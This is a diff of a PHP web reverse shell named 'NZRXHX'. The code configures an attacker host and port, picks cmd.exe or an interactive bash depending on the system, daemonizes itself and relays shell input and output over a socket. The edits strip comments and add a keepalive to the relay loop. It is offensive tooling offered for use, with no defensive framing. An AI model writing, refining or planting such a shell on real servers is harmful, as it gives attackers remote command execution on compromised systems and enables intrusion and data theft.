@@ -1,23 +1,21 @@
 <?php
-// WRITTEN AND MAINTAINED BY NZR
-
+// ============== NZRXHX =============
+// NZRXHX PHP based web reverse shell
 // ========== CONFIGURATION ==========
-$allowed_hosts = ['192.168.1.1'];  // Attacker IP(s)
-$remote_host   = '192.168.1.1';    // Attacker IP
-$remote_port   = 443;                  // Listener port (TCP or SSL)
+$allowed_hosts = ['192.168.1.1'];
+$remote_host   = '192.168.1.1';
+$remote_port   = 443;
 $timeout       = 10;
 
 // ========== SANITY CHECK ==========
 $client_ip = gethostbyname(gethostname());
-if (!in_array($remote_host, $allowed_hosts)) {
-    exit;
-}
+if (!in_array($remote_host, $allowed_hosts)) exit;
 
-// ========== DETERMINE SHELL ==========
+// ========== SHELL ==========
 $os = strtoupper(substr(PHP_OS, 0, 3));
 $shell_cmd = ($os === 'WIN') ? 'cmd.exe' : '/bin/bash -i';
 
-// ========== FORK (DAEMONIZE) ==========
+// ========== DAEMONIZE ==========
 if (function_exists('pcntl_fork')) {
     $pid = pcntl_fork();
     if ($pid === -1) exit;
@@ -32,9 +30,9 @@ stream_set_blocking($socket, false);
 
 // ========== LAUNCH SHELL ==========
 $descriptors = [
-    0 => ['pipe', 'r'], // STDIN
-    1 => ['pipe', 'w'], // STDOUT
-    2 => ['pipe', 'w']  // STDERR
+    0 => ['pipe', 'r'],
+    1 => ['pipe', 'w'],
+    2 => ['pipe', 'w']
 ];
 $process = proc_open($shell_cmd, $descriptors, $pipes);
 if (!is_resource($process)) {
@@ -44,22 +42,33 @@ if (!is_resource($process)) {
 foreach ($pipes as $p) stream_set_blocking($p, false);
 
 // ========== MAIN LOOP ==========
-while (!feof($socket) && !feof($pipes[1])) {
+$last_keepalive = time();
+
+while (true) {
     $read = [$socket, $pipes[1], $pipes[2]];
     $write = $except = null;
 
-    if (stream_select($read, $write, $except, 0) === false) break;
+    $changed = stream_select($read, $write, $except, 30); // 30s timeout
+    if ($changed === false) break;
 
-    foreach ($read as $r) {
-        if ($r === $socket) {
-            $in = fread($socket, 2048);
-            if ($in === false) break 2;
-            fwrite($pipes[0], $in);
-        } else {
-            $out = fread($r, 2048);
+    if (in_array($socket, $read)) {
+        $in = fread($socket, 2048);
+        if ($in === false || strlen($in) === 0) break;
+        fwrite($pipes[0], $in);
+    }
+
+    foreach ([$pipes[1], $pipes[2]] as $pipe) {
+        if (in_array($pipe, $read)) {
+            $out = fread($pipe, 2048);
             if ($out === false) break 2;
             fwrite($socket, $out);
         }
+    }
+
+    // Optional: keepalive ping every 60s
+    if (time() - $last_keepalive > 60) {
+        fwrite($socket, "\n");
+        $last_keepalive = time();
     }
 }
 
